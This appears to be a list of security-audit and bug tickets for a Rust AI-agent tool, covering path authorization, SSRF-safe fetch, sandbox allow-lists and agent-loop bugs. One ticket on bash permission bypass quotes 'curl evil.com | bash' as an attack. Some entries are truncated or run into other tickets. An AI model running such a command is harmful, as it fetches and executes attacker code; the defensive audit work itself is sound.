title: [AUDIT] Apply external-path authorization to find_files
description:
## Problem / security impact
`find_files` can enumerate paths outside the approved workspace without the external-path permission check applied by `read`. Enumeration leaks names and structure even when file contents are not opened.

## Scope / files
- `src/agent/tools/find_files.rs`
- external-path helpers in `src/permission/checker.rs:517-535`
- find-files tool and permission tests

## Required implementation
Authorize the canonical search root before walking it. Reuse one shared external-path policy with `read`/`grep`; do not decide security from raw path prefixes or raw glob strings. Define omitted-root, relative, traversal, absolute, tilde, and symlink behavior. Keep the authorized root bound to the actual traversal root, and fail before enumeration on Deny/Ask failure or permission-channel closure.

## Acceptance criteria
- Workspace-local searches retain current behavior.
- Absolute external roots, `../` traversal, tilde paths, and directory-symlink escapes ask or deny consistently with `read`.
- Denied roots yield no filenames or partial results.
- Glob matching cannot change the authorized traversal root.

## Validation
Run `cargo test find_files_external_path_permission` and `cargo test agent::tools::find_files`. Tests cover local, external absolute, traversal, tilde, symlink escape, empty root, and permission-channel failure. Expected result: enumeration starts only after the exact canonical root is authorized.
acceptance_criteria: find_files authorizes the exact canonical traversal root and emits no results for denied or escaping paths.

title: [AUDIT] Apply external-path authorization to grep
description:
## Problem / security impact
`grep` can read paths outside the approved workspace without applying the external-path permission policy used by the `read` tool. Pattern approval alone does not authorize the searched files and permits unintended disclosure.

## Scope / files
- `src/agent/tools/grep.rs`
- external-path helpers in `src/permission/checker.rs:517-535`
- grep tool tests and permission-checker tests

## Required implementation
Resolve and authorize the search root/path separately from the pattern before filesystem traversal. Reuse the canonical external-path policy used by `read`; do not implement a raw string-prefix check. Define behavior for omitted path, relative traversal, absolute paths, tilde expansion, and symlinks. Revalidate the resolved root used by the operation so authorization and execution refer to the same path. Permission Deny/Ask/channel errors must prevent traversal and return a normal tool error.

## Acceptance criteria
- Workspace-local grep retains current behavior.
- Absolute external paths, `../` traversal, tilde paths, and symlink escapes trigger the same Ask/Deny decision as `read`.
- The pattern itself cannot be mistaken for path authorization.
- A denied external path is never opened or walked.

## Validation
Add named tests and run `cargo test grep_external_path_permission` plus `cargo test agent::tools::grep`. Cover local, absolute external, traversal, tilde, directory symlink escape, and permission-channel failure. Expected result: only canonical workspace-contained roots execute without external-path approval.
acceptance_criteria: grep independently authorizes its canonical search path; traversal, absolute, tilde, and symlink escapes cannot bypass external-path policy.

title: [D2] Enforce full immutable skill identity and lifecycle-safe CRUD
description:
## Outcome
Define full immutable learned-JS artifact identity and lifecycle-safe CRUD so metadata/tests/capabilities cannot drift under one ID and tampered rows never execute.

## Owned files and boundaries
- `src/extras/js/skills/artifact.rs`: versioned canonical serialization, full SHA-256 identity, capability/tag/export normalization and typed validation.
- `src/extras/js/skills/store.rs`: identity-validating insert/read/list, embedding persistence, optimistic retire, explicit privacy purge/tombstone APIs.
- `src/extras/js/tests/skill_store_identity.rs`: canonical vectors, mutation, tamper, collision, lifecycle, and purge fixtures.

`mini-agent-yxy` owns schema/migrations; `mini-agent-y8n` verifier; lifecycle promotion/rollback is Phase 4/5.

## Required implementation
1. Use versioned unambiguous length-prefixed exact UTF-8 encoding over source, ordered embedded tests, ordered exports/signatures, description, normalized ordered tags, full capability tier/allowed-host manifest, and identity schema version.
2. Compute full 64-hex SHA-256 in trusted domain/store code. Operational status/time/telemetry/lineage/row-version/embedding metadata remains outside identity.
3. Reject caller ID mismatch and same-ID/different-payload collision; byte-identical insertion is idempotent. Identity-bearing fields have no update API and legacy short IDs never activate without explicit migration.
4. Recompute identity at insert, active read, and index-load boundaries. Tampered/corrupt rows fail closed before source leaves the store and become diagnosable for quarantine.
5. Implement typed `insert_verified`, `get`, `list_retrievable`, model-versioned embedding persistence, optimistic `retire`, and explicit privacy `purge`. Retirement preserves bytes/lineage; purge removes dependencies and creates a non-secret anti-resurrection tombstone.
6. Return typed non-panicking not-found/stale/database/corruption/collision/capability errors.

## Non-goals
Do not define SQLite schema, run verification tests, generate embeddings, rank results, promote/canary/rollback, or mutate identity-bearing fields.

## Acceptance Criteria
- Canonical test vectors are stable; changing any identity field/order changes ID, while operational changes do not.
- Caller mismatch, row tamper, legacy short ID, malformed capability/metadata, and simulated collision never return executable/retrievable source.
- Byte-identical insert is idempotent; retire is optimistic and reversible only through authorized lifecycle; purge removes dependencies and tombstones identity.
- Active/index reads return only identity-valid lifecycle-eligible rows with exact immutable bytes.

## Verification
Run:
```bash
cargo test --features js,skills skill_store_identity
cargo test --features js,skills skill_store_crud
cargo test --features js,skills skill_store_tamper
cargo test --features js,skills
cargo install --path . --debug
```
Fixtures must cover every identity field/order/normalization/version, operational mutations, caller mismatch, duplicate/collision, DB tamper, legacy IDs, malformed JSON/capability, embedding model metadata, stale retire, purge/tombstone, round trip, and active/index exclusion.
acceptance_criteria: SkillStore recomputes a full SHA-256 over versioned canonical identity data including source and tests, rejects caller/tamper/collision mismatches, and covers the complete CRUD contract including delete.
notes: 2026-07-28 capability correction: identity covers the full manifest (tier plus normalized exact allowed-host list), not just a broad tier. Tier/list mismatch, unknown/duplicate hosts, and admin/security-sensitive hosts are rejected.

title: [D2] Enforce SSRF-safe fetch authorization on every destination
description:
## Problem / security impact
A URL-glob permission check alone does not prevent SSRF. Approved hostnames can resolve to loopback/private/link-local/metadata addresses, redirect to them, or change DNS answers between check and connect. Embedded credentials and unsupported schemes create additional ambiguity.

## Scope / files
- `src/extras/js/host.rs` fetch URL parsing/authorization
- JS permission bridge and `src/permission/checker.rs` `js/fetch` policy
- URL/network policy config and Phase 2 spec
- deterministic resolver/redirect tests

## Required implementation
Parse URLs with one trusted parser; allow only explicitly approved schemes (normally `https`, optionally `http` by policy), reject embedded credentials, fragments/options that are not supported, and malformed/ambiguous hosts. Resolve all addresses before connect and reject loopback, private, link-local, multicast, unspecified, reserved, and cloud metadata destinations for IPv4/IPv6, including mapped forms. Bind connection to authorized resolution results or revalidate at connect to address DNS rebinding. Send `js/fetch` permission for the normalized URL and exact resolved destination policy. Disable automatic redirects and repeat scheme, credentials, resolution, destination, allow-list, and permission authorization at every hop with a finite hop count. Define proxy behavior so it cannot bypass destination policy.

## Acceptance criteria
- Localhost, RFC1918, link-local, IPv6 local, multicast/reserved, and common metadata endpoints are denied by default even via hostname.
- Embedded credentials and non-approved schemes are denied.
- DNS answer changes and redirects to denied destinations cannot bypass checks.
- Every hop has a finite permission wait and denial starts no request to that destination.
- Public allowed destinations work under explicit policy.

## Validation
Run `cargo test --features js,sandbox js_fetch_ssrf_policy` with an injected fake resolver and local servers. Cover all address classes, IPv4-mapped IPv6, decimal/alternate host forms accepted by the parser, rebinding, redirect chains/loops, credential URLs, schemes, proxy configuration, Allow/Deny/Ask/timeout/channel closure, and an allowed public-test address without Internet access. Run `cargo test --features js,sandbox`.
acceptance_criteria: Fetch authorizes allowed schemes and every resolved/redirect destination, rejects credentials and non-public/metadata addresses including DNS rebinding, and handles permission outcomes with deterministic local tests.

title: [D2] Implement bounded fetch transport with redirect control
description:
## Problem / security impact
The proposed `reqwest::blocking::Client::new()` plus `resp.text()` has no connect/read/total deadline or body bound and follows redirects implicitly. It can hang the JS thread, exhaust memory/decompression, or bypass authorization at a redirect.

## Scope / files
- `src/extras/js/host.rs` `FetchResult` and fetch transport
- `Cargo.toml` reqwest features
- `src/extras/js/types.rs` cancellation/result state as needed
- deterministic local HTTP test fixtures

## Required implementation
Construct/inject a configured blocking client with finite connect, per-read, and total host-call deadlines. Disable automatic redirects; return each redirect target to the authorization layer for revalidation before the next request. Bound request body, headers, response headers, compressed bytes, decompressed bytes, and returned text. Stream incrementally rather than unbounded `text()`. Support only explicitly documented methods/options and reject invalid headers/encodings as typed JS errors. Propagate cancellation and ensure a fetch failure does not kill the JS thread. Do not use public Internet in tests.

## Acceptance criteria
- Slow connect/read and endless bodies terminate within limits.
- Compressed and decompressed response limits are both enforced.
- Redirects are not followed by the transport without authorization of the new target.
- Returned status/body/truncation-or-error semantics are deterministic.
- Cancellation/channel errors leave the JS thread usable.

## Validation
Run `cargo test --features js,sandbox js_fetch_transport` against local TCP/HTTP fixtures for normal response, slow headers/body, endless body, oversized headers/body, compression bomb, redirect, cancellation, malformed response, and recovery. Then run `cargo test --features js,sandbox` and `cargo test --features js`.
acceptance_criteria: Fetch transport uses an injected bounded client, finite connect/read/total deadlines, compressed/decompressed/body caps, manual redirect handoff, cancellation, and deterministic local tests.

title: [D2] Enforce JS file allow-lists at final read/write operations
description:
## Problem / security impact
Checking an allow-list before `std::fs::read_to_string`/`write` leaves a check/use race and can follow a swapped symlink. Compile-time signature differences also risk a safe sandbox build but unsafe plain-JS build.

## Scope / files
- `src/extras/js/host.rs` `make_read_file`, `make_write_file`, and registration
- JS engine/tool configuration plumbing
- filesystem host integration tests

## Required implementation
Thread one `AllowConfig` policy through production host registration whenever file globals exist; do not create a parallel unrestricted signature. Apply the Phase 1 `js/read_file`/`js/write_file` permission check and Phase 2 allow-list, then revalidate containment immediately at descriptor-relative/no-follow open or mutation. For writes, use the race-resistant atomic-write contract and safely handle nonexistent targets. Treat allow-list as an additional restriction: permission approval cannot override a denied root unless an explicitly designed higher-level policy says so. Handle policy/config/channel errors as JS errors with no I/O.

## Acceptance criteria
- In-root authorized reads/writes succeed; either permission denial or allow-list denial prevents I/O.
- Final/parent symlink swaps between check and operation cannot escape the root.
- Plain `js` and `js,sandbox` feature rows do not expose an unrestricted alternate closure.
- Empty lists and malformed config follow the deny-safe policy.
- Errors do not panic or kill the JS thread.

## Validation
Run `cargo test --features js,sandbox js_file_allow_enforcement`, `cargo test --features js,sandbox`, and `cargo test --features js`. Integration tests race final/parent symlink swaps, exercise nonexistent targets and sibling-prefix paths, combine Allow/Deny with allowed/denied roots, and assert no outside file is read or changed. Run `cargo test`.
acceptance_criteria: Read/write operations enforce both permission and canonical allow-list policy on the final opened/mutated target with no-follow revalidation, including TOCTOU and nonexistent-target tests.

title: [D2] Define canonical, symlink-safe JS file allow-list policy
description:
## Problem / security impact
The proposed allow-list uses raw glob/prefix matching and treats an empty list as unrestricted. Traversal, sibling prefixes, symlinks, and nonexistent write targets can escape the intended roots.

## Scope / files
- `src/extras/js/host.rs` `AllowConfig` and policy helper
- config schema/loading for JS read/write roots
- `docs/specs/phase-2-sandbox.md`
- path-policy unit tests

## Required implementation
Define an explicit base directory for relative configuration and normalize policies into absolute component-aware roots at load/startup. Decide containment using canonical paths and path components, never raw string prefixes or raw glob matches. For nonexistent write targets, canonicalize the nearest existing parent and validate the remaining relative components. Define final/parent symlink behavior and reject ambiguous paths. Empty or invalid lists must deny all; unrestricted access requires an explicit documented opt-in and still remains permission-gated. Separate read and write roots, and return typed reasons safe for JS/user display.

## Acceptance criteria
- `/safe` does not allow `/safe-evil`, `../` escapes, alternate separators, or symlink escapes.
- Relative policies resolve against one documented base, independent of process CWD.
- Nonexistent write targets under an approved canonical parent can be represented safely; escaping targets cannot.
- Empty/malformed policy denies rather than grants unrestricted access.
- The helper returns an authorization decision only; final operations revalidate separately.

## Validation
Run `cargo test --features js,sandbox js_file_allow_policy`. Tests cover exact root, descendants, sibling-prefix, traversal, relative root/CWD changes, existing and dangling symlinks, parent symlink, nonexistent target, empty list, malformed path, and explicit unrestricted opt-in if provided. Run `cargo test --features js,sandbox` and `cargo test --features js`.
acceptance_criteria: JS file allow-list decisions use normalized absolute component containment rooted at an explicit base, deny safely on empty/invalid policy, and specify symlink/nonexistent-target behavior with adversarial tests.

title: [D2] Add adversarial JS engine and permission lifecycle tests
description:
## Problem / security impact
Passing 692 repository tests currently hides that only two JS-specific tests exist. Critical timeout, OOM, permission, resource, and recovery invariants have no executable proof.

## Scope / files
- `src/extras/js/tests/mod.rs` and focused test modules
- production `JsTool`/engine/host/permission bridge paths
- deterministic local process/filesystem fixtures

## Required implementation

Exercise the production bridge/tool path where possible rather than only calling private helpers. All tests need outer wall-clock guards and no public-network dependency.

- Every permission outcome and channel lifecycle failure is covered.

- A following step succeeds and cannot see globals from the prior runtime.
- Tests are deterministic under parallel execution and clean all processes/files.

The JS test command must exercise the named adversarial cases and finish within the documented CI timeout; each individual infinite/OOM case has an outer timeout. Run `cargo test --features js,sandbox` once Phase 2 is available.

title: [D2] Map JS timeout, OOM, jobs, and exceptions without panics
description:
## Problem / security impact
The bead's proposed OOM rule—classifying a later `Runtime::new()` failure—does not identify OOM in the runtime that exhausted memory. Exception handling can also assume an object exception and panic on primitive thrown values. Promise jobs and endless microtasks need the same deadline as eval.

## Scope / files
- `src/extras/js/engine.rs` `run_step` and pending-job drain
- `src/extras/js/types.rs` `JsOutcome`
- `src/extras/js/tests/`
- rquickjs 0.12 behavior documented in code comments/tests

## Required implementation
Determine and encode the verified rquickjs 0.12 signal emitted by the current runtime when its memory limit is exceeded; construct `JsOutcome::OomKilled` from that signal. Do not infer prior OOM from the next runtime construction. Set memory/stack limits and the interrupt handler before eval. Drain pending jobs with the same overall deadline and a bounded job/turn policy so endless microtasks time out. Extract object exception stacks when available, but safely stringify primitive throws and rejected-Promise reasons. Map timeout, OOM, syntax/runtime error, and rejected job deterministically without message-substring ambiguity where typed APIs are available. Always drop the runtime and keep the JS thread alive.

## Acceptance criteria
- A current-runtime allocation limit produces `OomKilled`.
- Infinite eval and endless microtasks produce `Timeout` within the configured bound.
- `throw 'x'`, `throw 1`, `throw null`, syntax errors, and rejected Promises return safe errors without panic.
- Stack/line information is included when available.
- A fresh step after every OOM/timeout/error evaluates `1+1` to `2` with no leaked globals.

## Validation
Run `cargo test --features js js_outcome_mapping` and `cargo test --features js`. Add deterministic tests for OOM, infinite loop, endless microtasks, primitive/object throws, rejected jobs, syntax errors, and post-failure recovery/state isolation. Expected variants must be asserted directly, not by broad string matching. Run `cargo test` for feature-gate cleanliness.
acceptance_criteria: Current-runtime OOM, timeout, rejected jobs, primitive throws, syntax/runtime errors map deterministically to JsOutcome variants, never panic, and a fresh runtime succeeds afterward.

title: MISSING-FEATURE: No token budget enforcement across continuation iterations
description:
## What is wrong
While max_tokens is passed to the model and token usage is tracked via events (usage.input_tokens, output_tokens), there is no enforcement of context window limits or token budgets across continuations. Each continuation iteration can potentially use the full context window again, and there's no tracking or enforcement of cumulative token usage. The model could theoretically use 2x, 3x, or up to 11x the context window across the outer loop iterations.

## Exploit / failure scenario
Context window is 200k tokens. User runs agent with max_tokens=180k. First continuation uses 180k, second uses another 180k from the same 200k window. Model overwrites earlier conversation context. Or, context window overflow silently truncates early messages.

## Fix
Track cumulative input/output tokens across continuations. Before calling continue_prompt_injector, check if adding the current continuation would exceed the context window. If so, trigger compaction or abort gracefully.

## Verification
Integration test: set context_window to 100k, trigger multiple continuations, verify cumulative token tracking, verify that an error or compaction is triggered if window is exceeded.

title: BUG: Tool name not tracked correctly when tool result arrives for unknown tool
description:
## What is wrong
When a ToolResult is received, the tool name is retrieved via last_tool_name.take().unwrap_or_default() at line 437. If a tool result arrives without a corresponding tool call (e.g., out-of-order stream items or first item is a result), last_tool_name is None and unwrap_or_default() produces an empty string. The event at line 454 sends a ToolResult with an empty name, and the history at line 458 includes a tool result with undefined tool association. This produces confusing logs and history entries.

## Exploit / failure scenario
Stream items arrive out of order: ToolResult before ToolCall. Event shows: ToolResult { name: '', output: '...' }. History shows unattributed tool result. Model doesn't know which tool produced the result.

## Fix
Validate that last_tool_name is Some before processing a ToolResult. If None, either: (1) log an error and skip the result, or (2) extract the tool name from the ToolResult structure itself if available.

## Verification

title: BUG: Tool result extraction silently produces empty output for non-text content
description:
## What is wrong
When a ToolResult is received (line 432-459), the output is extracted by iterating over tool_result.content and only including ToolResultContent::Text blocks (line 440). If a tool result contains only non-text content (e.g., structured data, images, or other media types), the output string remains empty. The empty output is then sent as an AgentEvent::ToolResult at line 453 and added to tool_interactions at line 458 without any warning or indication that the result was empty. The model receives a tool result with no visible output, which may confuse it or cause it to retry the same tool.

## Exploit / failure scenario
A tool that returns a structured JSON result (not wrapped in text) produces an empty output event. The model sees '[ToolResult]: read_file' with no content, doesn't know what the file contains, and may either retry the read or produce an incorrect response based on missing information.

## Fix
When tool_result.content contains no text blocks, either: (1) log a warning indicating the result was empty and send it with a note, or (2) format non-text content as a string representation (e.g., 'json: {structured_data}'), ensuring the model always receives useful feedback.

title: BUG: Tool interactions vector grows unbounded across continuations
description:
## What is wrong

This vector is passed to continue_prompt_injector at line 557, where it's added to the history via extend_from_slice at line 275 of continue_prompt_injector. The vector is never pruned. With up to 11 outer loop iterations and potentially 10+ tool calls per iteration, the vector could contain 100+ Message items. Each continuation adds all prior tool interactions to history again, causing redundant context inclusion.

## Exploit / failure scenario
A session with multiple continuations accumulates all tool interactions in memory and context. A 100-tool-call session with 5 continuations includes 500+ tool interaction messages in final context, wasting tokens and potentially exceeding context window for no benefit (model already saw all previous interactions).

## Fix
Track the count of tool interactions sent in prior continuations and only include new interactions in subsequent continuations. Or, implement a sliding window that keeps only the most recent N tool interactions.

title: BUG: track_read off-by-one error in displayed end line number

Remove the saturating_sub(1). Change line 53 to: let end = offset + limit; The 1-indexed end line is simply offset + limit when offset is 0-indexed.

title: INCOMPLETE: Async hook handlers spawned without tracking or awaiting
description:
## What is wrong
When handler.is_async is true, the handler is spawned with tokio::spawn() without storing the JoinHandle or awaiting it. This creates fire-and-forget tasks with no way to ensure they complete before the dispatch function returns. If the agent is cancelled or exits while async handlers are in flight, they may be interrupted mid-execution and leave side effects incomplete.

## Exploit / failure scenario
Async hook (e.g., a webhook to notify external system) is spawned → dispatch() returns immediately → agent task is cancelled or finishes → tokio runtime ends before async hook completes → webhook is never sent or partially sent.

## Fix
Collect JoinHandles from all async handler spawns and either: (1) track them and await them before the next major operation, (2) wrap them in a GuardDrop similar to SubagentGuard to abort them if the parent is cancelled, or (3) use structured concurrency to ensure async handlers are awaited before dispatch returns.

## Verification
Create an async hook that logs completion to a file. Spawn it, then immediately cancel the agent or exit. Verify the log file contains the completion message (hook finished) rather than being absent or truncated.

title: MISSING-FEATURE: Unused PermRequest and PermResponse types suggest incomplete permission integration
description:
## What is wrong
PermRequest (line 31) and PermResponse (line 38) are defined but never constructed or used anywhere. The tool.rs check_perm() at line 54 checks permissions before sending code to the JS engine, but there is no mechanism for the JS engine thread to request permission for individual host calls (spawn, read_file, write_file). This means all three host calls are allowed unconditionally once the initial code is approved.

## Exploit / failure scenario
User disallows 'spawn' permission in their profile. A script passes initial permission checks, then calls spawn() inside the JS engine. The spawn() call executes without permission check because the host.rs functions don't consult the permission system — they call std::process::Command directly.

## Fix
Complete the permission integration: (1) Use PermRequest/PermResponse to send permission checks from host.rs back to the tokio runtime; (2) Have make_spawn(), make_read_file(), make_write_file() send PermRequest through a channel (passed via closure or thread-local); (3) Wait for PermResponse before executing the operation; (4) Update tests to verify permission denial blocks individual host calls.

## Verification

title: BUG: glob_to_regex doesn't escape regex special characters
description:
## What is wrong
The glob_to_regex function converts glob patterns to regex but only escapes '.' and handles glob wildcards. Other regex special characters like '(', ')', '[', ']', '+', '^', '$', etc. are not escaped. If a glob pattern contains these as literal characters, they'll be misinterpreted as regex metacharacters.

## Exploit / failure scenario
User calls grep with include='test(1).js' intending to match files literally named 'test(1).js'. The function produces regex 'test(1)\.js', which matches 'test1.js' instead because '(1)' is a capturing group, not literal characters.

## Fix
Add escaping for all regex special characters that are not part of glob syntax. Characters to escape: ( ) [ ] + ^ $ | \. Use: re.push_str(&regex::escape(&c.to_string())) for non-glob chars, or maintain a list of safe pass-through characters.

## Verification

title: INCOMPLETE: Insufficient shell metacharacter escaping in bash tool command splitting
description:
## What is wrong
The bash tool splits commands on certain operators (&&, ||, |, >>, ;) for permission checking, but splits only on the operators that appear outside quotes. This could lead to incomplete permission checks if an attacker encodes restricted commands inside shell constructs that are not recognized. While the full command is still passed to sandbox.output_command, the permission system only sees the split tokens. Example: 'echo ok; eval(base64)' might get split only by semicolon, but if quotes are involved, some dangerous constructs might be missed.

## Exploit / failure scenario
Attacker provides: echo hello && (curl evil.com | bash). split_bash_commands splits on && to get ['echo hello', '(curl evil.com | bash)']. Permission check is done on each part separately. If 'curl' is not blocked in permission list, the attacker bypasses curl blocking.

## Fix
Strengthen permission checking for bash: (1) perform static analysis on the AST instead of token-based splitting, (2) deny all commands by default and use allowlist instead of denylist, or (3) document that bash tool assumes the permission checker validates the entire command string including all subshells and pipes

## Verification
Create permission rules that block 'curl', then attempt to run: echo safe && (curl evil.com); verify that either the curl command is denied or it's documented that partial command analysis is not supported

title: [AUDIT] Protect session persistence with private filesystem permissions
description:
## Problem / security impact
Session persistence in `src/session/storage.rs:44-85` can create directories/files with process-default permissions. Sessions may contain prompts, source, command output, or secrets and must not become readable by other local users.

## Scope / files
- `src/session/storage.rs:44-85`
- atomic-write helper interaction
- session storage tests and user-facing storage documentation

## Required implementation
On Unix create session directories as `0700` and files, lock files, and temporary files as `0600` from creation time (not chmod only after writing). Define behavior for existing paths with broader modes: repair safely when owned and regular, otherwise reject with a clear error. Do not follow symlinks while repairing. Preserve platform-appropriate behavior on Windows and explicitly document that ACL enforcement differs.

## Acceptance criteria
- New directories are `0700`; new/final/temp files are `0600` independent of umask.
- Unsafe existing regular-file modes are repaired or rejected according to the documented policy.
- Symlink and wrong-owner/non-regular paths are rejected without mutation.
- Failure cleanup does not leave readable temporary session content.

## Validation
On Unix run `cargo test session_storage_permissions`; set permissive umasks and assert exact modes for directories, temporary files, final files, repair/reject cases, and symlinks. Run `cargo test`. Add a non-Unix test for the documented branch and ensure CI exercises it where available.
acceptance_criteria: Session directories/files/temp/lock files are private from creation, unsafe existing paths are safely repaired or rejected, Unix modes are exact, and real Windows ACL tests exclude broad inherited read access.

title: [D2] Retrieve skills from the user prompt before model generation and publish a turn manifest
description:
## Outcome
Perform provider-neutral discovery once from the current user prompt before model generation, sharing one compatible query embedding while keeping Agent Skills instructions, learned-JS code, and MCP tools as separate typed/authority domains.

## Owned files and boundaries
- `src/agent/runner.rs`: user-turn boundary and retrieval-before-first-stream ordering.
- `src/extras/js/skills/turn.rs` (or established turn module): normalized query, fingerprints, typed `TurnDiscoveryBundle`/`TurnSkillBundle`, deterministic manifest assembly and budgets.
- `src/extras/js/tests/prompt_time_skill_retrieval.rs`: order, retries, typed-domain, provider, and failure fixtures.

Consume the shared `Embedder`, learned-JS `SkillIndex`, and Agent Skills catalog/loader. `mini-agent-dqf` owns binding learned-JS source into JS requests/runtime. Existing MCP builder/tool code remains authoritative for advertised schemas and permission-wrapped invocation.

## Required implementation
1. At each user-turn boundary, build one bounded deterministic retrieval query from the current prompt plus an explicitly bounded recent-task suffix. Exclude generated JS, tool output, unbounded history, timestamps, secrets, and random IDs.
2. Normalize/fingerprint/embed that query once. Fan the already-computed vector only to compatible typed indexes; learned JS and Agent Skills retain independent score floors, top-k, byte/token budgets, dedupe, generations, and failure diagnostics.
3. Freeze query fingerprint, model revision, each index generation, selected IDs/digests, scores, and exact resolved content in one immutable per-turn bundle. Retries and continuations reuse it; a later user prompt creates a new one.
4. Before the first model token, inject selected Agent Skills as bounded trusted instruction sections with digest/provenance and full selected `SKILL.md` body. Inject learned JS as a compact manifest of full IDs, descriptions, exports/signatures, and capability manifests only; source reaches only `mini-agent-dqf`.
5. Keep MCP tool schemas in the provider tool channel. Agent Skill `allowed-tools`, instruction text, and learned-JS metadata cannot grant MCP/host permission, invoke a server, or change existing `mcp_tool:{server}:{tool}` checks.
6. Enforce deterministic section order and independent budgets. A failure in one domain yields an empty diagnostic-bearing section for that domain without substituting unscored content or disabling primitive JS/MCP.
7. Preserve provider independence, history semantics, and token accounting; no store/index call or reranking occurs on the QuickJS thread or from model-generated code.

## Non-goals
Do not import/index Agent Skill archives, generate stored embeddings, rank inside the embedder, expose learned source in the prompt, execute Agent Skill resources/scripts, auto-approve capabilities, or vector-search MCP tools unless a separate measured/spec-approved task is filed.

## Acceptance Criteria
- A spy proves query construction and one embedding complete before the first model stream; generated code/tool output are absent and retries do not re-embed/rerank.
- Agent Skills and learned JS receive independent deterministic selections/budgets from one compatible vector and one frozen turn; metadata/source/instruction bytes match their recorded generations.
- The model sees selected Agent Skill instructions and learned-JS manifests, but no learned source, inert resource execution, or implicit MCP/host grants.
- Zero results, threshold filtering, per-domain model/index/load failure, token pressure, retry/continuation, a new prompt, and every provider path behave deterministically.

## Verification
Run:
```bash
cargo test --features js,skills prompt_time_skill_retrieval
cargo test --features js,skills prompt_time_typed_discovery
cargo test --features js,skills prompt_time_retrieval_failures
cargo test --features js,skills turn_skill_bundle
cargo test --features js,skills
cargo test --features js
cargo install --path . --debug
```
Fixtures must cover order before first token, exactly one embedding, independent rankings/floors/budgets, deterministic section order, manifest/body generation agreement, retries/continuations, later prompts, zero results, one-domain failure, token limits, malicious `allowed-tools`/instructions, no learned-source prompt leak, and provider backends.

title: [D2] Build immutable exact dense + FTS SkillIndex with deterministic fusion
description:
## Outcome

1. Build immutable generation-stamped snapshots only from identity-valid active rows. Keep full IDs/metadata and pre-normalized equal-dimension `f32` vectors in deterministic contiguous storage; vector BLOBs are read only while building a snapshot.
2. Perform exact dot-product top-k with bounded candidate selection. Query FTS5/BM25 only over bounded identifiers, exports/signatures, tags, and descriptions, then fuse ranked lists by configured RRF.
3. Apply calibrated dense/lexical floors, permit zero results, deterministic full-ID tie breaks, semantic/lineage dedupe, and independent manifest/source count+byte budgets.

## Acceptance Criteria
- Search performs no stored-skill embedding or SQLite vector-table scan and returns one deterministic generation-consistent bounded result set.
- Dense, lexical, mixed, irrelevant/below-floor, duplicate, tie, and all lifecycle/model mismatch fixtures produce specified rankings or zero results.
- Concurrent reads are lock-bounded and deterministic while a separate snapshot is constructed.
- At 100,000 revisions, the implementation exposes the independent timing/memory counters required by the benchmark task.

## Outcome

- `src/extras/js/tests/skill_embedder.rs`: deterministic fake backend plus optional real-model smoke fixtures.

Inputs are bounded deterministic text documents or a normalized retrieval query. Outputs are finite normalized vectors plus exact model ID/revision/dimensions/normalization metadata. Store/index/catalog callers persist or rank outputs; the embedder does neither.

## Required implementation
1. Initialize configured BGE-small-en-v1.5 (or the exact spec-selected revision) once per service and expose immutable model metadata. Multiple indexes share the same service instance.
2. Build deterministic learned-JS documents from description, exports/signatures, normalized tags, and bounded sorted identifiers. Provide a typed document constructor so Agent Skills can supply their distinct metadata document without entering learned-JS storage.
3. Batch document embeddings for admission/reindex/catalog refresh and provide one prompt-query embedding API. Validate non-empty, finite, equal-dimension output and normalize once.
4. Run CPU inference in a bounded blocking worker with cancellation and saturation errors; never run model work on the QuickJS or async executor thread.
5. Cache queries by `(model_revision, sha256(normalized_retrieval_query))` with explicit entry/byte bounds and deterministic eviction. The same vector may fan out to typed indexes only when model metadata matches.
6. Return typed, redacted errors for model initialization/download, empty/non-finite/wrong-dimension output, cancellation, worker panic, and saturation.

## Non-goals
Do not open SQLite, persist embeddings, build/search an index, select context, merge trust domains, initialize a separate Agent Skills model, or lazily embed stored artifacts during a request.

## Acceptance Criteria
- Concurrent callers cause one model initialization and bounded worker use; cancellation/saturation cannot deadlock startup or prompt processing.
- Document bytes and query fingerprints are deterministic, cache bounds/eviction are observable, and all returned vectors carry exact compatible metadata.
- Admission/reindex APIs batch stored documents; prompt-time code embeds only the normalized query once and never a stored skill.
- Failure yields typed diagnostics and an empty typed retrieval domain rather than unscored content.

## Verification

Log the send error even if ignored: `if let Err(e) = req.reply.send(...) { tracing::debug!("JS engine reply channel closed: {}", e); }`. This helps with debugging and makes the failure visible in logs.
